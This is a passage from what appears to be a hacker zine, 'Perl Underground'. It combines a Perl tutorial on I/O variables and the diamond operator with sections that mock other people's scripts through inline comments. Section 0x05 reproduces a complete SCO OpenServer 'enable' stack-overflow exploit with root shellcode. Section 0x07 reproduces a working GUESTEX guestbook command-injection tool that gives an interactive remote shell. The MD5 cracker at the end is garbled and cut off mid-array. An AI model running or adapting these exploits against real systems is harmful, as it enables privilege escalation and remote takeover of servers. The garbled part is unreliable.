In addition to the record-separator use of $/, you can set it to a reference to a positive integer,
which means that you will read that many bytes at on each read:

while (read(FILE, $buf, 1024)) { ... }

# is like

{
  local $/ = \1024;
  while ($buf = &lt;FILE&gt;) { ... }
}
If you&#39;re wondering why I continually local()ize $/, it is to make sure that the change to $/ are
restricted to where we want it. We don&#39;t want future filehandle-reads to be using the changed
value.

The $/ variable is also used by chomp() -- this function doesn&#39;t just remove a newline from the end
of its arguments, it removes the value of $/ from the end of them (if it&#39;s there).
Outputting Records
There are a couple of variables related to printing records as well. The $\ variable (the output
record separator) and the $, variable (the output field separator). The mnemonics for these two are
rather simple:
$\ goes where you put a \n in your print()
$, goes where you put a , in your print()
The fact that $\ and $/ share a mirrored character is not a mistake either -- they are related in
that each is the other&#39;s opposite.

How are they useful? They let you be obscenely lazy. Let&#39;s say you&#39;re playing with the /etc/passwd
file:

open PASSWD, &quot;/etc/passwd&quot;
  or die &quot;can&#39;t read /etc/passwd: $!&quot;;
open MOD, &quot;&gt; /etc/weirdpasswd&quot;
  or die &quot;can&#39;t write to /etc/weirdpasswd: $!&quot;;

$\ = $/;   # ORS = IRS = &quot;\n&quot;
$, = &quot;:&quot;;  # OFS = &quot;,&quot;

while (&lt;PASSWD&gt;) {
  chomp;  # removes $/ from $_
  my @f = split $,;  # splits $_ on occurrences of $,
  # fool around with @f
  print MOD @f;
}

close MOD;
close PASSWD;
If we hadn&#39;t set $\ and $, in this code, the output file would have been one long line of fields,
with nothing in between each field, and no way to separate one record from the next. However, since
we have set them, we automatically append $\ to each print() statement, and automatically insert $,
in between each argument to print(). Here&#39;s the explicit code that doesn&#39;t use these two variables:

while (&lt;PASSWD&gt;) {
  chomp;
  my @f = split &#39;:&#39;;
  # fool around with @f
  print MOD join(&#39;:&#39;, @f), &quot;\n&quot;;
}
While that may end up being more clear than the other, it&#39;s only that way because you&#39;ve not been
exposed to the variables. I&#39;m sure before you learned how to use $_, your code was a lot more
verbose; but once you embrace that default variable, code like

for my $line (@lines) {
  chomp $line;
  my @fields = split /=/, $line;
  for my $f (@fields) { $f =~ s/-&gt;/: /; }
  # ...
}
became code like

for (@lines) {
  chomp;
  my @fields = split /=/;
  for (@fields) { s/-&gt;/:/ }
  # ...
}
It&#39;s the same with these other variables.
While We&#39;re Being Lazy...
There&#39;s no variable that symbolizes the default filehandle to print to -- if you print() with no
filehandle mentioned, Perl assumes you mean to print to STDOUT.

Well, not necessarily. The default output handle can be changed. Its default value is STDOUT, but
you can change that with the select() function:

print &quot;to stdout\n&quot;;
my $oldfh = select MOD;
print &quot;to mod\n&quot;;
select $oldfh;
print &quot;to stdout\n&quot;;
Assuming you start out with STDOUT as your default output handle, the code runs as is described.
The select() function (in the single argument form) takes a filehandle, sets it as the default, and
returns the previously select()ed filehandle.

You can call select() with no arguments, and it will merely return the current default filehandle
(as an information source).
Huffering, Puffering, and Buffering
Another useful filehandle variable is $| the autoflush variable. This variable is unique for each
filehandle -- output to STDERR is flushed automatically, but output to STDOUT is not. This variable
is a true boolean -- it either holds a true value (which gets stored as 1) or a false value (which
gets stored as 0).

Buffering is the process of storing output until a certain condition is reached (such as a newline
is encountered). When a buffer is flushed, its contents are emptied. Where do they go? Well, to the
filehandle proper. A buffer is a temporary holding location between the process generating the
output and the place the output will appear.

Like I said, each filehandle has its own buffer control. To set the autoflush variable for a given
filehandle, you have to use select(), or the standard IO::Handle module&#39;s autoflush method.

# turn on autoflushing for OUT
{
  my $old = select OUT;
  $| = 1;
  select $old;
}

# another way, using IO::Handle
use IO::Handle;
autoflush OUT 1;
The IO::Handle module offers many helpful methods for filehandles (which are internally objects of
the IO::Handle class). You might want to see what else it has to offer that you might want to use.

You can make your own per-filehandle variables via the Tie::PerFH module, available on CPAN.
Obfuscorner
In the evil Perl spirit of &quot;there&#39;s more than one way to do it&quot;, there&#39;s an obfuscated way to turn
on autoflushing for a filehandle. It combines the three lines (save the old handle, set $|, restore
the old handle) into one:

select((select(OUT), $|=1)[0]);
The dissection of this code is as follows:
select(OUT) makes OUT the default handle and returns the previous handle
$| = 1 sets autoflush to true, after the select(OUT) has been executed
(select(OUT), $|=1)[0] is a list slice -- it takes the first element of the list (select(OUT),
$|=1), which is the value returned by select(OUT) (the previous filehandle)
select(...) makes that value the default filehandle -- and what is ...? it&#39;s the first element of
the list (described above)
Delightfully icky!

Another trick is to take advantage of the fact $| is always either 0 or 1. If it&#39;s 0, and you
subtract 1, -1 is transformed into 1. Subtracting 1 again gives you 0 again. Thus, $|-- is a
builtin flip-flop!

# alternate indenting and not indenting lines
for (@data) {
  print &quot;  &quot; x $|--;
  print &quot;$_\n&quot;;
}
This doesn&#39;t work with $|++... can you see why?
The Magic of &lt;&gt;
The final mystery revealed is a lengthy one. We all know we can read input via &lt;STDIN&gt;. But what
about the mysterious empty diamond operator, &lt;&gt;? What does it do, and how can we interact with its
magic?

The empty diamond operator is related to @ARGV, $ARGV, the ARGV filehandle, the ARGVOUT filehandle,
and $^I. You probably know one of these (@ARGV) already. The others will soon be made clear. First
here&#39;s a sample program:

#!/usr/bin/perl -w

# inplace.pl ext code [files]
# ex: inplace.pl .bak &#39;$_ = &quot;&quot; if /^#/&#39; *.pl

use strict;

$^I = shift;
my $code = shift;

while (&lt;&gt;) {
  eval $code;
  print;
}
All the following symbols are strict-safe.
@ARGV
the list of command-line arguments to your program
when using &lt;&gt;, Perl uses these arguments as sources of input (so you can read from &quot;ls |&quot;!)
if the array is empty to begin with, Perl puts &quot;-&quot; in there, which means &quot;read from STDIN&quot;
when a file is being read, it is removed (shift()ed) from the array
$ARGV
this holds the input source currently begin read from
ARGV
this is the filehandle opened, using $ARGV
ARGVOUT
if $^I is not undef, this is the output filehandle being printed to
it is select()ed automatically
$^I
this is the in-place editing backup extension variable, and can be set from the command-line via
the -i switch
if this isn&#39;t undef, the loop will read from ARGV and write to ARGVOUT
if it contains the &quot;*&quot; character, the value is not an extension, but the new name of the file (so
if modifying foo.txt and $^I is &quot;old-*&quot;, the backup file is old-foo.txt)
Knowing this, our code can be written rather explicitly. You&#39;re about to see why Perl is so nice to
you.

#!/usr/bin/perl -w

use strict;

my $ext = shift;
my $code = shift;

@ARGV = &#39;-&#39; unless @ARGV;

FILE:
while (defined($ARGV = shift)) {
  my $backup;

  # if we&#39;re not working with STDIN...
  if ($ARGV ne &#39;-&#39;) {
    # get backup filename
    if ($ext =~ /\*/) { ($backup = $ext) =~ s/\*/$ARGV/ }
    else { $backup = &quot;$ARGV$ext&quot; }

    # try renaming file
    rename $ARGV =&gt; $backup or
      warn(&quot;Can&#39;t rename $ARGV to $backup: $!, skipping file.&quot;) and
      next FILE;
  }

  # with STDIN, there&#39;s no real backup done
  else { $backup = &#39;-&#39; }

  open ARGV, &quot;&lt; $backup&quot; or
    warn(&quot;Can&#39;t open $backup: $!&quot;) and
    next FILE;

  # if we&#39;re not dealing with STDIN,
  # but $backup is $ARGV, we&#39;re doing real
  # in-place editing, so we use a Unix trick:
  #   * open the file for reading
  #   * unlink it
  #   * open the file for writing
  # this is a miracle, but it fails in DOS :(

  if ($backup ne &#39;-&#39; and $backup eq $ARGV) {
    unlink $backup or
      warn(&quot;Can&#39;t remove $backup: $!, skipping file.&quot;) and
      next FILE;
  }

  open ARGVOUT, &quot;&gt; $ARGV&quot; or
    warn(&quot;(panic) Can&#39;t write $ARGV: $!, skipping file.&quot;) and
    next FILE;

  while (&lt;ARGV&gt;) {
    eval $code;
    print ARGVOUT;
  }

  close ARGVOUT;
  # note: we don&#39;t close ARGV!
}
Aren&#39;t you glad Perl does all that hard work for you?

Now that you know about these symbols, you can use some of them to your advantage. Here&#39;s a bit of
code that prints each line of input with the source and the line number in front of it. Notice,
though, that since the code that Perl uses never closes ARGV, the $. variable never gets reset to
0. That means the line count keeps increasing:

while (&lt;&gt;) {
  print &quot;$ARGV ($.): $_&quot;;
}
If we have two files, a.txt and b.txt whose contents are &quot;abc\ndef\nghi\n&quot; and &quot;jkl\nmno\n&quot;
respectively, this program outputs:


a.txt (1): abc
a.txt (2): def
a.txt (3): ghi
b.txt (4): jkl
b.txt (5): mno
Now, what if we want the line number to be reset for each new file? We need to be able to detect
the end of the file. We can do that with the eof() function! There are two ways we can use the
function for detecting the end of each input:

while (&lt;&gt;) {
  print &quot;$ARGV ($.): $_&quot;;
  close ARGV if eof;  # reset $.
}

# or

while (&lt;&gt;) {
  print &quot;$ARGV ($.): $_&quot;;
  close ARGV if eof(ARGV);  # reset $.
}
If you don&#39;t use any parentheses, and don&#39;t send an argument, Perl will check the last filehandle
read from. If you send an argument, it checks that filehandle. &quot;But japhy! What about eof()?&quot; you
ask? Well, that&#39;s a very special case. If you want to know when you&#39;ve reached the end of all the
input, you can use eof():

while (&lt;&gt;) {
  print &quot;$ARGV ($.): $_&quot;;
  print &quot;==end==\n&quot; if eof();  # after ALL data
}
Lazy Loops
In addition to the -i switch, Perl offers switches like -n and -p, which construct loops around the
source of your code:

perl -ne &#39;print if /foo/&#39; files
# becomes
perl -e &#39;while (&lt;&gt;) { print if /foo/ }&#39; files

perl -pe &#39;s/foo/bar/&#39; files
# becomes
perl -e &#39;while (&lt;&gt;) { s/foo/bar/ } continue { print }&#39; files
You can use -p with -i to write a simple one-liner file editor:

# keep backups
perl -pi.bak -e &#39;s/PERL/Perl/g&#39; files

# don&#39;t keep backups
perl -pi -e &#39;s/PERL/Perl/g&#39; files
Why do you think you have to say -pi -e, and can&#39;t use -pie?
References
Using files:
open(): perldoc -f open
close(): perldoc -f close
select(): perldoc -f select
eof(): perldoc -f eof
overview: perldoc perlopentut
File-specific variables:
$/, $\, $|, $,, $.: perldoc perlvar
chomp(): perldoc -f chomp
the IO::Handle module: perldoc IO::Handle
&lt;&gt; magic:
the -i, -n, and -p switches: perldoc perlrun

-[0x05] # prdelka&#39;s cameo ------------------------------------------------

# This is a very boring and straight-forward script to ridicule.
# However, we had a personal request for prdelka.
# prdelka sticks to what he knows, and his code is a bit elusive these days.
# Perl Underground always seeks to please.

#!/usr/bin/perl

# This is almost strict compliant.
# Push yourself to new heights and learn to use it!

# SCO Openserver 5.0.7 enable exploit
# ===================================
# A standard stack-overflow exists in the handling of
# command line arguements in the &#39;enable&#39; binary. A user
# must be configured with the correct permissions to
# use the &quot;enable&quot; binary. SCO user documentation suggests
# &quot;You can use the asroot(ADM) command. In order to grant a
# user the right to enable and disable tty devices&quot;. This
# exploit assumes you have those permissions.
#
# Example.
# 
# $ id
# uid=200(user) gid=50(group) groups=50(group)
# $ perl enablex.pl
# # id
# uid=0(root) gid=50(group) egid=18(lp) groups=50(group)
#
# - prdelka

# The intense complexities of this program demanded an example.

my $buffer;
$buffer .=&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;; 
# .= is unneeded when the variable has no original contents to add to.
$buffer .=&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;;
# my $buffer = &quot;\x90&quot; x 52;
# Save some effort.
 
$buffer .=&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x68\xff\xf8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16&quot;; 
$buffer .=&quot;\x31\xc0\x50\x68&quot;;
$buffer .=&quot;/ksh&quot;;
$buffer .=&quot;\x68&quot;;
$buffer .=&quot;/bin&quot;; 
$buffer .=&quot;\x89\xe3\x50\x50\x53\xb0\x3b\xff\xd6&quot;;
for($i = 0;$i &lt;= 7782;$i++)
# for (0 .. 7782) { }
{
        $buffer .= &quot;A&quot;;
# $buffer .= &#39;A&#39; x 7782; # To skip your loop entirely!
}

$buffer .= &quot;\x3f\x60\x04\x08&quot;;

# my $buffer = &quot;\x90&quot; x 52 . &quot;\x68\xff\xf8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16\x31\xc0\x50\x68&quot; 
#	     . &quot;/ksh\x68/bin\x89\xe3\x50\x50\x53\xb0\x3b\xff\xd6&quot; . &#39;A&#39; x 7782 . &quot;\x3f\x60\x04\x08&quot;;

system(&quot;/tcb/bin/asroot&quot;,&quot;enable&quot;,$buffer);
# You are free to add spacing between your parameters, or any other applicable place as suits your aesthetics.

# You used 20 lines of comments for what was essentially a two statement script.
# You spread those two statements into 15 awkward lines.

-[0x06] # School You: mauke ----------------------------------------------

#line 2 &quot;unip.pl&quot;
use strict;
use Irssi ();

our $VERSION = &#39;0.03&#39;;
our %IRSSI = (
	authors =&gt; &#39;mauke&#39;,
	name =&gt; &#39;unip&#39;,
);

use 5.008;
use Encode qw/decode encode_utf8/;
use Unicode::UCD &#39;charinfo&#39;;

sub unip {
	my @pieces = map split, @_;
	my @output;
	for (@pieces) {
		$_ = &quot;0x$_&quot; if !s/^[Uu]\+/0x/ and /[A-Fa-f]/ and /^[[:xdigit:]]{2,}\z/;
		$_ = oct if /^0/;
		unless (/^\d+\z/) {
			eval {
				my $tmp = decode(length &gt; 1 ? &#39;utf8&#39; : &#39;iso-8859-1&#39;, &quot;$_&quot;, 1);
				length($tmp) == 1 or die &quot;`$_&#39; is not numeric, conversion to unicode failed&quot;;
				$_ = ord $tmp;
			};
			if ($@) {
				(my $err = $@) =~ s/ at .* line \d+.*\z//s;
				push @output, $err;
				next;
			}
		}
		my $utf8r = encode_utf8(chr);
		my $utf8 = join &#39; &#39;, unpack &#39;C*&#39;, $utf8r;
		my $x;
		unless ($x = charinfo $_) {
			push @output, sprintf &quot;U+%X (%s): no match found&quot;, $_, $utf8;
			next;
		}
		push @output, &quot;U+$x-&gt;{code} ($utf8): $x-&gt;{name} [$utf8r]&quot;;
	}

	join &#39;; &#39;, @output
}

Irssi::command_bind(
	unip =&gt; sub {
		my ($data, $server, $witem) = @_;
		$server-&gt;command(&quot;echo &quot; . unip $data);
	},
);
Irssi::command_bind(
	sunip =&gt; sub {
		my ($data, $server, $witem) = @_;
		$witem-&gt;command(&quot;say &quot; . unip $data);
	},
);

-[0x07] # (K-)sPecial boy ------------------------------------------------

# Now the question of the hour, will this get rm&#39;d when someone posts it to .aware public ftp?

# K-sPecial is a rapid and effective coder. He also completely lacks formal Perl learning
# He&#39;s learned piece by piece, but has missed much and could benefit from some reeducation
# He makes it work, and knows a lot of tricks
# but this code is new, and all your virtues won&#39;t save you from a little rubbing this time

# no shebang line?
# I guess you fill your pound quota below

## Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
## Name: GUESTEX-exec.pl
## Date: 06/07/2006
## Version: 1.00
##  1.00 (06/07/2006) - GUESTEX-exec.pl created
## 
## Description: GUESTEX guestbook is vulnerable to remote code execution in how it 
##  handles it&#39;s &#39;email&#39; parameter. $form{&#39;email&#39;} is used when openning a pipe to 
##  sendmail in this manner: open(MAIL, &quot;$sendmail $form{&#39;email&#39;}) where $form{&#39;email&#39;} 
##  is not properly sanitized.
##
## Usage: specify the host and location of the script as the first argument. hosts can 
##  contain ports (host:port) and you CAN specify a single command to execute via the 
##  commandline, although if you do not you will be given a shell like interface to 
##  repeatedly enter commands.
#######################################################################################

# definitely POD worthy commenting
# you might find POD liberating, lets you rant on even more

use IO::Socket;
use strict;

my $host = $ARGV[0];
my $location = $ARGV[1];
my $command = $ARGV[2];
my $sock;
my $port = 80;
my $comment = $ARGV[3] || &quot;YOUR SITE OWNS!\n&quot;;
# keep them in a nice order, or do it in a straight bunch

if (!($host &amp;&amp; $location)) { 
	die(&quot;-!&gt; perl $0 &lt;host[:port]&gt; &lt;location&gt; [command] [comment]\n&quot;);
}

$port = $1  if ($host =~ m/:(\d+)/);
# chuckle

while (1) { 
	my $switch = 0;
	if (!($ARGV[2])) {
		print &#39;guestex-shell$ &#39;;
		chomp($command = &lt;STDIN&gt;);
	}

	my $cmd = &quot;;echo --1337 start-- ;$command; echo --1337 end--&quot;;
	$cmd =~ s/(.)/sprintf(&quot;%%%x&quot;, ord($1))/ge;

	my $POST = &quot;POST $location HTTP/1.1\r\n&quot;  		             .
	           &quot;Host: $host\r\n&quot;                                         .
		   &quot;User-Agent: mozilla\r\n&quot;                                 .
	           &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;     .
		   &quot;Content-length: &quot; . length(&quot;surname=ax0r&amp;nationality=american&amp;country of residence=USA&amp;preview=no&amp;action=add&amp;name=ax0r&amp;site=ax0r net&amp;url=www.ax0r.net&amp;location=atlanta,ga&amp;rating=10&amp;comment=$comment&amp;email=ax0r\@yahoo.com$cmd&quot;) . &quot;\r\n&quot; . 
		   &quot;Referer: $host\r\n\r\n&quot;;
	
	$POST .= &quot;surname=ax0r&amp;nationality=american&amp;country of residence=USA&amp;preview=no&amp;action=add&amp;name=ax0r&amp;site=ax0r net&amp;url=www.ax0r.net&amp;location=atlanta,ga&amp;rating=10&amp;comment=$comment&amp;email=ax0r\@yahoo.com$cmd&quot;;
	
# couldn&#39;t you have done &quot;my $sock = ... &quot; here, instead of defining it way up there?
	$sock = IO::Socket::INET-&gt;new(&#39;PeerAddr&#39; =&gt; &quot;$host&quot;,
# what the hell. Why is that quoted? WHY? JUST FOR THE HELL OF IT? YOU KNOW BETTER
        	                      &#39;PeerPort&#39; =&gt; $port,
                	              &#39;Proto&#39;    =&gt; &#39;tcp&#39;,
				      &#39;Type&#39;     =&gt; SOCK_STREAM) or die (&quot;-!&gt; unable to connect to &#39;$host:$port&#39;: $!\n&quot;);

	$sock-&gt;autoflush();

	print $sock &quot;$POST&quot;; # AGAIN!

	#$switch = 1; # used for debugging if you think &#39;echo&#39; might not be working, etc
	 
	while (my $line = &lt;$sock&gt;) {
		if ($line =~ m/^\-\-1337\ start\-\-$/) {
# this is what eq is for
# if ($line eq &#39;--1337 start--&#39;) {
			$switch = 1;
			next;
		}
# be fun! one-line the whole block!
# or can you figure out how? ;]
		if ($line =~ m/^\-\-1337\ end\-\-$/) {
			close($sock);
			last;
		}
		print $line if $switch;
	}
	exit if $ARGV[2];
# you assigned it, let it go, let it go free!!!
}

# Cheers captain. Sorry about xzziroz. it couldn&#39;t have happened to a nicer guy
# take this article in stride, as you handled the ZF0/xzziroz issue.

-[0x08] # School You: McDarren -------------------------------------------

#!/usr/bin/perl -w
#
# pmgoogle.pl
# Generates compressed KMZ (Google Earth) files
# with placemarks for Perlmonks monks
# See: earth.google.com
#
# Darren - July 2006

use strict;
use XML::Simple;
use LWP::UserAgent;
use Storable;
use Time::HiRes qw( time );

my $start = time();
say(&quot;$0 started at &quot;, scalar localtime($start));

# Where everything lives
my $monkfile = &#39;/home/mcdarren/scripts/monks.store&#39;;
my $kmlfile = &#39;/home/mcdarren/temp.kml&#39;;
my $www_dir = &#39;/home/mcdarren/var/www/googlemonks&#39;;
my $palette_url = &#39;http://mcdarren.perlmonk.org/googlemonks/img/monk-palette.png&#39;;

my $monks;  # hashref
$|++;

# Uncomment this for testing
# Avoids re-fetching the data
#if (! -f $monkfile) {
    # Fetch and parse the XML from tinymicros
    $monks = get_monk_data();
    store $monks, $monkfile;
#}

$monks = retrieve($monkfile)
    or die &quot;Could not retrieve $monkfile:$!\n&quot;;

# A pretty lousy attempt at abstraction :/
my %types = (
    by_level    =&gt; {
        desc        =&gt; &#39;By Level&#39;,
        outfile     =&gt; &#39;perlmonks_by_level.kmz&#39;,
        },
    by_name     =&gt; {
        desc        =&gt; &#39;By Monk&#39;,
        outfile     =&gt; &#39;perlmonks_by_monk.kmz&#39;,
        }
);

my @levels = qw(
    Initiate Novice Acolyte Sexton
    Beadle Scribe Monk Pilgrim
    Friar Hermit Chaplain Deacon
    Curate Priest Vicar Parson
    Prior Monsignor Abbot Canon
    Chancellor Bishop Archbishop Cardinal
    Sage Saint Apostle Pope
    );

# Create a reference to a LoL,
# which represents xy offsets to each of the
# icons on the palette image
# The palette consists of 28 icons in a 7x4 grid
my $xy_data = get_xy();

my @t = time();
print &quot;Writing and compressing output files...&quot;;
for (keys %types) {
    open OUT, &quot;&gt;&quot;, $kmlfile
        or die &quot;Could not open $kmlfile:$!\n&quot;;
    my $kml = build_kml($monks, $_);
    print OUT $kml;
    close OUT;

    write_zip($kmlfile, &quot;$www_dir/$types{$_}{outfile}&quot;);
}

$t[1] = time();
say(&quot;done (&quot;, formatted_time_diff(@t), &quot; secs)&quot;);

my $end = time();
say(&quot;Total run time &quot;, formatted_time_diff($start, $end), &quot; secs&quot;);
say(&quot;Total monks: &quot;, scalar keys %{$monks-&gt;{monk}});
exit;

####################################
# End of main - subs below
####################################
sub say {
    # Perl Hacks #86
    print @_, &quot;\n&quot;;
}

sub formatted_time_diff {
    return sprintf(&quot;%.2f&quot;, $_[1]-$_[0])
}

sub by_level {
    return $monks-&gt;{monk}{$b}{level} &lt;=&gt; $monks-&gt;{monk}{$a}{level}
    || lc($a) cmp lc($b);
}

sub by_name {
    return lc($a) cmp lc($b);
}

sub write_zip {
    my ($infile, $outfile) = @_;
    use Archive::Zip qw( :ERROR_CODES :CONSTANTS );

    my $zip = Archive::Zip-&gt;new();
    my $member = $zip-&gt;addFile($infile);
    return undef unless $zip-&gt;writeToFileNamed($outfile) == AZ_OK;
}

sub build_kml {
    # This whole subroutine is pretty fugly
    # I really wanted to do it without an if/elsif,
    # but I couldn&#39;t figure out how

    my $ref = shift;
    my $type = shift;
    my $kml = qq(&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
        &lt;kml xmlns=&quot;http://earth.google.com/kml/2.1&quot;&gt;
        &lt;Folder&gt;
        &lt;name&gt;Perl Monks - $types{$type}{desc}&lt;/name&gt;
        &lt;open&gt;1&lt;/open&gt;);

    if ($type eq &#39;by_level&#39;) {
        my $level = 28;
        $kml .= qq(&lt;Folder&gt;&lt;name&gt;Level $level - Pope&lt;/name&gt;&lt;open&gt;0&lt;/open&gt;\n);
        for my $id (sort by_level keys %{$ref-&gt;{monk}}) {
            my $mlevel = $ref-&gt;{monk}{$id}{level};
            if ($mlevel &lt; $level) {
                $level = $mlevel;
                my $level_name = $levels[$level-1];
                $kml .= qq(&lt;/Folder&gt;&lt;Folder&gt;&lt;name&gt;Level $level - $level_name&lt;/name&gt;&lt;open&gt;0&lt;/open&gt;\n);
            }
            $kml .= mk_placemark($id,$mlevel);
        }
        $kml .= q(&lt;/Folder&gt;);
    }
    elsif ($type eq &#39;by_name&#39;) {
        my @monks = sort by_name keys %{$ref-&gt;{monk}};
        my $nummonks = scalar @monks;
        my $mpf = 39; # monks-per-folder
        my $start = 0;

        while ($start &lt; $nummonks) {
            my $first = lc(substr($monks[$start],0,2));
            my $last = defined $monks[$start+$mpf]
                     ? lc(substr($monks[$start+$mpf],0,2))
                     : lc(substr($monks[-1],0,2));
            $kml .= qq(&lt;Folder&gt;&lt;name&gt;Monks $first-$last&lt;/name&gt;&lt;open&gt;0&lt;/open&gt;\n);
            MONK:
            for my $cnt ($start .. $start+$mpf) {
                last MONK if !$monks[$cnt];
                my $monk = $monks[$cnt];
                my $mlevel = $ref-&gt;{monk}{$monk}{level};
                $kml .= mk_placemark($monk,$mlevel);
            }
            $start += ($mpf + 1);
            $kml .= q(&lt;/Folder&gt;);
        }
    }
    $kml .= q(&lt;/Folder&gt;&lt;/kml&gt;);
    return $kml;
}

sub mk_placemark {
    my $id = shift;
    my $mlevel = shift;
    my $p;
    $p = qq(
    &lt;Placemark&gt;
        &lt;description&gt;
        &lt;![CDATA[
            Level: $mlevel&lt;br \\&gt;
            Experience: $monks-&gt;{monk}{$id}{xp}&lt;br \\&gt;
            Writeups: $monks-&gt;{monk}{$id}{writeups}&lt;br \\&gt;
            User Since: $monks-&gt;{monk}{$id}{since}&lt;br \\&gt;
            http://www.perlmonks.org/?node_id=$monks-&gt;{monk}{$id}{id}
            ]]&gt;
        &lt;/description&gt;
        &lt;Snippet&gt;&lt;/Snippet&gt;
        &lt;name&gt;$id&lt;/name&gt;
        &lt;LookAt&gt;
            &lt;longitude&gt;$monks-&gt;{monk}{$id}{location}{longitude}&lt;/longitude&gt;
            &lt;latitude&gt;$monks-&gt;{monk}{$id}{location}{latitude}&lt;/latitude&gt;
            &lt;altitude&gt;0&lt;/altitude&gt;
            &lt;range&gt;10000&lt;/range&gt;
            &lt;tilt&gt;0&lt;/tilt&gt;
            &lt;heading&gt;0&lt;/heading&gt;
        &lt;/LookAt&gt;
        &lt;Style&gt;
            &lt;IconStyle&gt;
                &lt;Icon&gt;
                    &lt;href&gt;$palette_url&lt;/href&gt;
                    &lt;x&gt;$xy_data-&gt;[$mlevel-1][0]&lt;/x&gt;
                    &lt;y&gt;$xy_data-&gt;[$mlevel-1][1]&lt;/y&gt;
                    &lt;w&gt;32&lt;/w&gt;
                    &lt;h&gt;32&lt;/h&gt;
                &lt;/Icon&gt;
            &lt;/IconStyle&gt;
        &lt;/Style&gt;
        &lt;Point&gt;
            &lt;coordinates&gt;$monks-&gt;{monk}{$id}{location}{longitude},$monks-&gt;{monk}{$id}{location}{latitude},0&lt;/coordinates&gt;
        &lt;/Point&gt;
    &lt;/Placemark&gt;
    );

    return $p;
}

sub get_xy {
    # This returns an AoA, which represents xy-offsets
    # to each of the monk level icons on the image palette
    my @xy;
    for my $y (qw(96 64 32 0)) {
        for my $x (qw(0 32 64 96 128 160 192)) {
            push @xy, [ $x, $y ];
        }
    }
    return \@xy;
}

sub get_monk_data {
    my $monk_url = &#39;http://tinymicros.com/pm/monks.xml&#39;;
    my @t = time();
    print &quot;Fetching data....&quot;;

    my $ua = LWP::UserAgent-&gt;new();
    my $req = HTTP::Request-&gt;new(GET=&gt;&quot;$monk_url&quot;);
    my $result = $ua-&gt;request($req);
    return 0 if !$result-&gt;is_success;
    my $content = $result-&gt;content;
    $t[1] = time();
    say(&quot;done (&quot;, formatted_time_diff(@t), &quot; secs)&quot;);

    print &quot;Parsing XML....&quot;;
    my $monks = XMLin($content, Cache =&gt; &#39;storable&#39;);
    $t[2] = time();
    say(&quot;done (&quot;, formatted_time_diff(@t[1,2]), &quot; secs)&quot;);
    return $monks;
}

-[0x09] # Random Noob: Qex -----------------------------------------------

# Qex, where&#39;s the foreplay? 
# no shebang line, no modules, nothing. 
# you&#39;re an unready and unprotected virgin.

print &quot;\n QBrute v1.0 \n&quot;;
print &quot; By Qex \n&quot;;
print &quot; qex[at]bsdmail[dot]org \n&quot;;
print &quot; www.q3x.org \n\n&quot;;
print &quot;1) Calculate MD5.\n&quot;;
print &quot;2) Crack MD5.\n&quot;;

# heredocs or just quote it all

my $cmd;
print &quot;Command: &quot;;
$cmd = &lt;STDIN&gt;;

# its ok, you are new. chomp(my $cmd = &lt;STDIN&gt;);

if ($cmd &gt; 2) {
     print &quot;Unknown Command!\n&quot;;
     }

# elsif?
if ($cmd == 1) {
     use Digest::MD5 qw( md5_hex );
	#it isn&#39;t that intensive, you could just use it anyways!
     my $md5x;
     print &quot;\nView MD5 Hash Of: &quot;;
     $md5x = &lt;STDIN&gt;;
     chomp($md5x);
	# same trick as above...
     print &quot;Hash is: &quot;, md5_hex(&quot;$md5x&quot;), &quot;\n\n&quot;;
	# always with the quoting....
     }
if ($cmd == 2) {
# no longer lexical? what about the range operator? what about qw? 
# this feels so WRONG
@char = (Ð¹&#39;,&#39;ï¿½.&#39;,ï¿½.&#39;,&#39;Ðº&#39;,&#39;Ðµ&#39;,&#39;Ð½&#39;,&#39;Ð³&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,
&#39;Ð·&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;Ð²&#39;,&#39;Ð°&#39;,&#39;Ð¿&#39;,&#39;ï¿½.&#39;,&#39;Ð¾&#39;,&#39;Ð»&#39;,&#39;Ð´&#39;,
&#39;Ð¶&#39;,&#39;Ñ&#39;,&#39;Ñ&#39;,&#39;ï¿½.&#39;,&#39;Ñ&#39;,&#39;Ð¼&#39;,&#39;Ð¸&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;Ð±&#39;,&#39;ï¿½.&#39;,&#39;1&#39;,
&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;0&#39;,&#39;ï¿½.&#39;,&#39;Ð¦&#39;,&#39;Ð£&#39;,
&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;Ð&#39;,&#39;ï¿½.&#39;,&#39;Ð¨&#39;,&#39;Ð©&#39;,&#39;ï¿½.&#39;,&#39;Ð¥&#39;,&#39;Ðª&#39;,&#39;Ð¤&#39;,&#39;Ð«&#39;,
&#39;ï¿½.&#39;,&#39;Ð&#39;,&#39;ï¿½.&#39;,&#39;ï¿½ &#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;Ð­&#39;,&#39;Ð¯&#39;,&#39;Ð§&#39;,
&#39;Ð¡&#39;,&#39;ï¿½.&#39;,&#39;ï¿½.&#39;,&#39;Ð¢&#39;,&#39;Ð¬&#39;,&#39;ï¿½.&#39;,&#39;Ð®&#39;,
&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,
&#39;0&#39;,&#39; &#39;,&#39;`&#39;,&#39;-&#39;,&#39;=&#39;,&#39;~&#39;,&#39;!&#39;,&#39;@&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,
